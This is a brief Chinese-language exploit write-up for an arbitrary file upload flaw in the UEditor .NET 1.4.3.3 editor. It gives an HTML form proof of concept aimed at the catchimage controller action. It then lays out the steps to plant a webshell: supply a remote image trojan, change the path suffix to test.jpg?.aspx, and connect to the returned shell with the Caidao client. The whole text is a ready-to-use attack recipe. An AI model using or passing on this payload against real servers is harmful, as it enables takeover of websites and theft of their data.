# Ueditor编辑器.NET1.4.3.3版本任意文件上传漏洞

## 漏洞影响：

.NET 1.4.3.3版本

## 漏洞POC：

```html
<form action="www.XXXX.com.cn/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded" method="POST">
<p>shell addr:<input type="text" name="source[]"/></p>
<input type="submit" value="submit"/>
</form>
```

保存为html文件，打开后上传框输入远程图片马test.jpg，上传时路径最后改为test.jpg?.aspx

返回shell路径菜刀连接即可！